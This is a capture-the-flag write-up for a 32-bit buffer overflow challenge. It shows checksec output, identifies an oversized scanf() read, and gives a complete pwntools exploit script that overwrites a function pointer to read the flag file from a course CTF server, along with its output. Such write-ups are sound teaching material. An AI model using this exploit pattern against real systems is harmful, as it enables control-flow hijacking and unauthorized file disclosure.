# Buffer Overflow: CTF #5

## Checksec

```bash
$ checksec program
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
Debuginfo:  Yes
```

The `checksec` output is equivalent to the one in the guide:

- 32 bits program
- No canary to protect the stack (despite the output saying otherwise)
- Stack with read, write and execute permissions
- No Position Independent Executable (PIE) protection

## Source code analysis

- The file `rules.txt` is open and read when called by `readtxt()`.
- It is possible to read the contents of any file inside the server by modifying the function pointer `fun` to the address of `readtxt()`.
- The `scanf()` call is susceptible to buffer overflow because it specifies 45 bytes to be read into the `buf` variable, which is only 32 bytes long.

## Objective

Modify the function pointer `fun` to the address of `readtxt()` and point the first argument to the string `flag` using the buffer overflow vulnerability in the `scanf()` call, so that in line 27 the flag is printed instead of our input.

## Vulnerability exploration

- For this exploit, it is necessary to know the address of the `readtxt()` function, which is `0x080497a5` according to the output of `gdb`:
  ```bash
  $ gdb program
  [...]
  gdb-peda$ x readtxt
  0x80497a5 <readtxt>:	0x53e58955
  ```

Having this in mind, here is how the payload and the exploit script are built:
- `flag\0` as an argument to the `readtxt()` function.
- `_` to fill the rest of the buffer; the content itself is irrelevant.
- `\xa5\x97\x04\x08` to overwrite the `fun` pointer with the address of the `readtxt()` function.

The exploit script is as follows:
```python
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4000)
# r = process('./program')

# Payload =====================================================

s =  b"flag\0" + b"_" * 27 + b"\xa5\x97\x04\x08"

# =============================================================

res = r.recvuntil(b"flag:\n")
print(res)
r.sendline(s)
buf = r.recvall().decode(errors="backslashreplace")
print(buf)
```

Executing the script, results in obtaining the flag as follows:
```bash
$ python3 exploit.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4000: Done
b'Read the rules.\nTry to unlock the flag:\n'
[+] Receiving all data: Done (26B)
[*] Closed connection to ctf-fsi.fe.up.pt port 4000
flag{4dm1n_fun_w45_0wn3d}
```
